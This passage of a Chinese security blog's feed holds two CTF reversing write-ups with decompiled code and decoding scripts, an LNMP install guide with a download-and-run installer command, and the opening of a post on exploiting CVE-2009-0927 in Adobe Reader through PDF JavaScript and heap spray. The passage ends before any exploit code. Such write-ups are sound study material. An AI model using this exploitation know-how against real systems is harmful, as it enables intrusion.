keystone-engine</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724140304432.png" alt="image-20220724140304432"></p><p>在这里我发现我没有切换目录下载插件，但是没关系，我们将gef 和peda 文件夹放到tools里</p><p>在 gdbinit 中挂载插件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim ~/.gdbinit</span><br></pre></td></tr></table></figure><p>按 i 键编辑，从第二行开始输入下面内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#source /home/kali/tools/peda/peda.py</span></span><br><span class="line"><span class="comment">#source /home/kali/tools/gef/gef.py</span></span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724140843053.png" alt="image-20220724140843053"></p><p>选择插件中的其中一个，其他的注释掉，按esc键并输入:wq退出即可。</p><p>至此，pwn环境搭建完成。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;系统环境&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#系统环境&quot;&gt;&lt;/a&gt; 系统环境&lt;/h1&gt;
&lt;p&gt;**系统环境：**Linux kali 5.14.0-kali4-amd64 (2021-11-05)&lt;/</summary>
      
    
    
    
    <category term="工具" scheme="https://www.rgzzplus.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="pwn" scheme="https://www.rgzzplus.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界Reversing-x64Elf-100</title>
    <link href="https://www.rgzzplus.com/2022/07/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReversing-x64Elf-100/"/>
    <id>https://www.rgzzplus.com/2022/07/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReversing-x64Elf-100/</id>
    <published>2022-07-24T02:39:54.000Z</published>
    <updated>2022-07-24T02:42:33.525Z</updated>
    
    <content type="html"><![CDATA[<p>附件下载下来，后缀是 .re，起初我还以为是压缩文件，拖进bandizip结果识别为未知文件格式。</p><blockquote><p>google：.re 文件大多属于 Image File。<a href="https://filext.com/file-extension/~RE">原文</a></p></blockquote><p>然后我试着拖进 IDA，能解析。</p><p><img src="/2022/07/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReversing-x64Elf-100/image-20220722195957027.png" alt="image-20220722195957027"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(s, <span class="number">255</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_4006FD((__int64)s) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Incorrect password!&quot;</span>);</span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nice!&quot;</span>);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从反汇编代码中可以看到 sub_40006FD 函数是关键。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_4006FD</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-24h]</span></span><br><span class="line">  __int64 v3[<span class="number">4</span>]; <span class="comment">// [rsp+18h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">0</span>] = (__int64)<span class="string">&quot;Dufhbmf&quot;</span>;</span><br><span class="line">  v3[<span class="number">1</span>] = (__int64)<span class="string">&quot;pG`imos&quot;</span>;</span><br><span class="line">  v3[<span class="number">2</span>] = (__int64)<span class="string">&quot;ewUglpt&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="type">char</span> *)(v3[i % <span class="number">3</span>] + <span class="number">2</span> * (i / <span class="number">3</span>)) - *(<span class="type">char</span> *)(i + a1) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>*(char *)(v3[i % 3] + 2*(i / 3)) 是一个二维数组，它与 a1[i] 相差 1。</p><p>要想得到 a1 ，就 *(char *)(v3[i % 3] + 2*(i / 3)) - 1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="string">&quot;Dufhbmf&quot;</span>,<span class="string">&quot;pG`imos&quot;</span>,<span class="string">&quot;ewUglpt&quot;</span>]</span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    s+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i % <span class="number">3</span>][<span class="number">2</span> * <span class="built_in">int</span>(i / <span class="number">3</span>)])-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure><p>结果：Code_Talkers</p><blockquote><p>注意：用 int(i/3) 是由于 python 不会像 c/c++ 一样自动将触发取整。</p></blockquote><blockquote><p>参考:<a href="https://www.cnblogs.com/dyhaohaoxuexi/p/10610272.html">Reversing-x64Elf-100</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;附件下载下来，后缀是 .re，起初我还以为是压缩文件，拖进bandizip结果识别为未知文件格式。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;google：.re 文件大多属于 Image File。&lt;a href=&quot;https://filext.com/file-exten</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="攻防世界" scheme="https://www.rgzzplus.com/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    <category term="reverse" scheme="https://www.rgzzplus.com/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界666</title>
    <link href="https://www.rgzzplus.com/2022/07/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C666/"/>
    <id>https://www.rgzzplus.com/2022/07/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C666/</id>
    <published>2022-07-24T02:39:11.000Z</published>
    <updated>2022-07-24T02:41:47.094Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址：<a href="https://adworld.xctf.org.cn/challenges/details?hash=b77f33bb-046b-4be9-8507-00dacd0358fc_2">666</a></p><p>将附件下载到本地后，直接拖进 IDA 进行分析，点击进入 main 函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"> ; =============== S U B R O U T I N E =======================================</span><br><span class="line"> ; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line"> ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">                 public main</span><br><span class="line"> main            proc near               ; DATA XREF: _start+1D↑o</span><br><span class="line"></span><br><span class="line"> s               = byte ptr -1E0h   ; s[480]</span><br><span class="line"> var_F0          = byte ptr -0F0h   ; var_fo[240],存放scanf输入参数</span><br><span class="line"></span><br><span class="line"> ; __unwind &#123;</span><br><span class="line">            push    rbp</span><br><span class="line">            mov     rbp, rsp</span><br><span class="line">            sub     rsp, 1E0h</span><br><span class="line">            lea     rax, [rbp+s]</span><br><span class="line">            mov     edx, 1Eh        ; n</span><br><span class="line">            mov     esi, 0          ; c</span><br><span class="line">            mov     rdi, rax        ; s</span><br><span class="line">            call    _memset; memset(s, 0, 0x1EuLL);</span><br><span class="line">            </span><br><span class="line">            lea     rdi, format     ; &quot;Please Input Key: &quot;</span><br><span class="line">            mov     eax, 0</span><br><span class="line">            call    _printf</span><br><span class="line">            </span><br><span class="line">            lea     rax, [rbp+var_F0]</span><br><span class="line">            mov     rsi, rax</span><br><span class="line">            lea     rdi, aS         ; &quot;%s&quot;</span><br><span class="line">            mov     eax, 0</span><br><span class="line">            call    ___isoc99_scanf</span><br><span class="line">            </span><br><span class="line">            lea     rdx, [rbp+s]</span><br><span class="line">            lea     rax, [rbp+var_F0]</span><br><span class="line">            mov     rsi, rdx</span><br><span class="line">            mov     rdi, rax</span><br><span class="line">            call    encode;关键函数，这里对输入字符进行了加密</span><br><span class="line">            </span><br><span class="line">            lea     rax, [rbp+var_F0]</span><br><span class="line">mov     rdi, rax        ; s</span><br><span class="line">call    _strlen</span><br><span class="line">mov     rdx, rax</span><br><span class="line">mov     eax, cs:key</span><br><span class="line">cdqe</span><br><span class="line">cmp     rdx, rax</span><br><span class="line">jnz     short loc_138D</span><br><span class="line">lea     rax, [rbp+s]</span><br><span class="line">lea     rsi, enflag     ; &quot;izwhroz\&quot;\&quot;w\&quot;v.K\&quot;.Ni&quot;</span><br><span class="line">mov     rdi, rax        ; s1</span><br><span class="line">call    _strcmp</span><br><span class="line">test    eax, eax</span><br><span class="line">jnz     short loc_1381</span><br><span class="line">lea     rdi, aYouAreRight ; &quot;You are Right&quot;</span><br><span class="line">call    _puts</span><br><span class="line">jmp     short loc_138D</span><br><span class="line"> ; ---------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"> loc_1381:                               ; CODE XREF: main+A0↑j</span><br><span class="line">lea     rdi, aFlagThis1sF4ck ; &quot;flag&#123;This_1s_f4cker_flag&#125;&quot;</span><br><span class="line">            call    _puts</span><br><span class="line"></span><br><span class="line"> loc_138D:                               ; CODE XREF: main+86↑j</span><br><span class="line">                                         ; main+AE↑j</span><br><span class="line">            mov     eax, 0</span><br><span class="line">            leave</span><br><span class="line">            retn</span><br><span class="line">; &#125; // starts at 12D1</span><br><span class="line"> main       endp</span><br></pre></td></tr></table></figure><p>按下 F5 ，反汇编，这下就清楚程序运行逻辑了，程序对输入字符进行字符编码，然后与 enflag（“izwhroz”“w&quot;v.K”.Ni&quot;）进行比较。。。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">240</span>]; <span class="comment">// [rsp+0h] [rbp-1E0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">240</span>]; <span class="comment">// [rsp+F0h] [rbp-F0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x1E</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please Input Key: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v5);</span><br><span class="line">  encode(v5, (__int64)s);<span class="comment">//关键函数</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v5) == key )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s, enflag) )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You are Right&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;flag&#123;This_1s_f4cker_flag&#125;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以关键是要知道 encode 函数怎么加密输入的，之后用 encode 解密enflag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">encode</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+7Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(a1) != key )<span class="comment">//12h,18位</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Your Length is Wrong&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; key; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3[i + <span class="number">64</span>] = key ^ (a1[i] + <span class="number">6</span>);</span><br><span class="line">    v3[i + <span class="number">33</span>] = (a1[i + <span class="number">1</span>] - <span class="number">6</span>) ^ key;</span><br><span class="line">    v3[i + <span class="number">2</span>] = a1[i + <span class="number">2</span>] ^ <span class="number">6</span> ^ key;<span class="comment">//加密算法</span></span><br><span class="line">      </span><br><span class="line">    *(_BYTE *)(a2 + i) = v3[i + <span class="number">64</span>];</span><br><span class="line">    *(_BYTE *)(a2 + i + <span class="number">1LL</span>) = v3[i + <span class="number">33</span>];</span><br><span class="line">    *(_BYTE *)(a2 + i + <span class="number">2LL</span>) = v3[i + <span class="number">2</span>];<span class="comment">//指针赋值</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>python 脚本，加密脚本逆着小写，flag 就出来了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#&quot;izwhroz\&quot;\&quot;w\&quot;v.K\&quot;.Ni&quot;</span></span><br><span class="line">enflag=[<span class="number">105</span>, <span class="number">122</span>, <span class="number">119</span>, <span class="number">104</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">122</span>, <span class="number">34</span>, <span class="number">34</span>, <span class="number">119</span>, <span class="number">34</span>, <span class="number">118</span>, <span class="number">46</span>, <span class="number">75</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">78</span>, <span class="number">105</span>, <span class="number">0</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">18</span>,<span class="number">3</span>):</span><br><span class="line">    flag+=<span class="built_in">chr</span>((<span class="number">18</span>^enflag[i])-<span class="number">6</span>)</span><br><span class="line">    flag+=<span class="built_in">chr</span>((<span class="number">18</span>^enflag[i+<span class="number">1</span>])+<span class="number">6</span>)</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="number">18</span>^enflag[i+<span class="number">2</span>]^<span class="number">6</span>)    </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><blockquote><p>参考：</p><p>​<a href="https://blog.csdn.net/weixin_45556441/article/details/110529421">攻防世界-Reverse-666</a></p><p>​<a href="https://blog.csdn.net/weixin_45556441/article/details/110507144">CTF-Python常用函数语段详解</a></p><p>​<a href="http://www.ab126.com/goju/1711.html">ASCII 在线转换器</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;题目地址：&lt;a href=&quot;https://adworld.xctf.org.cn/challenges/details?hash=b77f33bb-046b-4be9-8507-00dacd0358fc_2&quot;&gt;666&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;将附件下载到本地后，直接拖进 I</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="攻防世界" scheme="https://www.rgzzplus.com/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    <category term="reverse" scheme="https://www.rgzzplus.com/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>安装LNMP</title>
    <link href="https://www.rgzzplus.com/2022/07/22/%E5%AE%89%E8%A3%85LNMP/"/>
    <id>https://www.rgzzplus.com/2022/07/22/%E5%AE%89%E8%A3%85LNMP/</id>
    <published>2022-07-22T00:19:12.000Z</published>
    <updated>2022-08-01T10:29:15.528Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="开启端口"><a class="markdownIt-Anchor" href="#开启端口"></a> 开启端口</h1><p>服务器：22，80，3389</p><h1 id="lnmp-是什么"><a class="markdownIt-Anchor" href="#lnmp-是什么"></a> LNMP 是什么？</h1><p>Linux  Nginx  MySQL  PHP</p><h1 id="安装-lnmp"><a class="markdownIt-Anchor" href="#安装-lnmp"></a> 安装 LNMP</h1><p>安装 screen：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install screen</span><br></pre></td></tr></table></figure><p>安装时会出现提问，都填 y</p><p>接着输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -S lnmp</span><br></pre></td></tr></table></figure><p>继续输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://soft.vpser.net/lnmp/lnmp1.6.tar.gz -cO lnmp1.6.tar.gz &amp;&amp; tar zxf lnmp1.6.tar.gz &amp;&amp; cd lnmp1.6 &amp;&amp; ./install.sh lnmp</span><br></pre></td></tr></table></figure><p>之后会选选项，都选默认（Default）</p><p>等待安装完成后，按下Ctrl+C 退出。</p><p><img src="/2022/07/22/%E5%AE%89%E8%A3%85LNMP/image-20220722010005501.png" alt="image-20220722010005501"></p><p>现在打开浏览器，输入[服务器地址]/p.php</p><p><img src="/2022/07/22/%E5%AE%89%E8%A3%85LNMP/image-20220722011725678.png" alt="image-20220722011725678"></p><p>现在把你的域名解析到该服务器，以阿里云为例。</p><blockquote><p>注意：这里我是为了测试主机能否启用，所以用内网ip进行解析，如果您需要外网访问，请用公网ip，百度 ‘ip’ 就能看到主机IP地址。</p></blockquote><img src="/2022/07/22/%E5%AE%89%E8%A3%85LNMP/image-20220722010346358.png" alt="image-20220722010346358" style="zoom:50%;"><p>接下来，在主机上绑定域名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lnmp vhost add</span><br></pre></td></tr></table></figure><p>输入你的域名：<a href="http://test.rgzzplus.com">test.rgzzplus.com</a></p><p>接下来是问你是否需要继续解析，不用就直接回车</p><p>然后是设置文件路径，回车默认</p><p>之后的按需选择 y/n</p><p><img src="/2022/07/22/%E5%AE%89%E8%A3%85LNMP/image-20220722011100668.png" alt="image-20220722011100668"></p><p>现在，来到刚刚的默认文件路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /home/wwwroot/test.rgzzplus.com/</span><br></pre></td></tr></table></figure><p>ls 后发现是空文件夹，接着就是存放我们的网站文件了</p><p>我这里直接使用小甲鱼老师提供的简历网站</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://test-fishc.oss-cn-hangzhou.aliyuncs.com/HWC/resume.zip</span><br></pre></td></tr></table></figure><p>下载完后，解压文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip resume.zip</span><br></pre></td></tr></table></figure><p>接下来，输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown www:www -R /home/wwwroot/test.rgzzplus.com/</span><br></pre></td></tr></table></figure><p>接着就能打开浏览器，查看网站了</p><p><img src="/2022/07/22/%E5%AE%89%E8%A3%85LNMP/image-20220722011559834.png" alt="image-20220722011559834"></p><img src="https://xxx.ilovefishc.com/forum/202003/03/122025sepn4rlfmrmpv8pf.png" alt="img"><blockquote><p>参考资料</p><p>​<a href="https://www.bilibili.com/video/BV1VE41147jU?p=1&amp;t=11&amp;vd_source=2fef7d81c913d5bf46b142b80676c5ec">【后端开发】10分钟教你从0搭建一台专属“云服务器”</a></p><p>​<a href="https://fishc.com.cn/forum.php?mod=forumdisplay&amp;fid=171&amp;filter=typeid&amp;typeid=301">【技术交流】<strong>小甲鱼10分钟教你从0搭建一台服务器</strong></a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;开启端口&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#开启端口&quot;&gt;&lt;/a&gt; 开启端口&lt;/h1&gt;
&lt;p&gt;服务器：22，80，3389&lt;/p&gt;
&lt;h1 id=&quot;lnmp-是什么&quot;&gt;&lt;a class=&quot;markdo</summary>
      
    
    
    
    <category term="工具" scheme="https://www.rgzzplus.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="LNMP" scheme="https://www.rgzzplus.com/tags/LNMP/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2009-0927：PDF中的JS</title>
    <link href="https://www.rgzzplus.com/2022/07/22/CVE-2009-0927%EF%BC%9APDF%E4%B8%AD%E7%9A%84JS/"/>
    <id>https://www.rgzzplus.com/2022/07/22/CVE-2009-0927%EF%BC%9APDF%E4%B8%AD%E7%9A%84JS/</id>
    <published>2022-07-22T00:16:24.000Z</published>
    <updated>2022-08-01T11:18:00.649Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="cve-2009-0927-简介"><a class="markdownIt-Anchor" href="#cve-2009-0927-简介"></a> CVE-2009-0927 简介</h1><p>Adobe Reader 是非常流行的 PDF 文件阅读器，在其 Collab 对象的 getIcon() 函数中存在一个缓冲区溢出漏洞。同时由于 PDF 文档中支持内嵌的 JavaScript，攻击者可以通过在 PDF 文档中植入恶意的 JavaScript 来向 getIcon()函数传递特制的参数以触发溢出漏洞， 并结合 Heap Spray 攻击来夺取计算机的控制权。</p><blockquote><p>Heap Spray：通过申请大量空间，来让程序命中，从而执行 shellcode</p></blockquote><h1 id="pdf-文档格式简介"><a class="markdownIt-Anchor" href="#pdf-文档格式简介"></a> PDF 文档格式简介</h1><p>PDF 文档是一种文本和二进制混排的格式，它由四部分构成。</p><ul><li>header：头部，标识 PDF 文档的版本。</li><li>body：主体，包含 PDF 文档的主体内容，各部分以对象方式呈现。</li><li>cross－reference：交叉引用表，通过交叉引用表可以快速的找到 PDF 文档中的各对象。</li><li>trailer：尾部，包含交叉引用的摘要和交叉引用表的起始位置。</li></ul><p>请新建一个 PDF 文档，用普通文本编辑器打开，参阅下边的格式注释来理解文件格式。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span 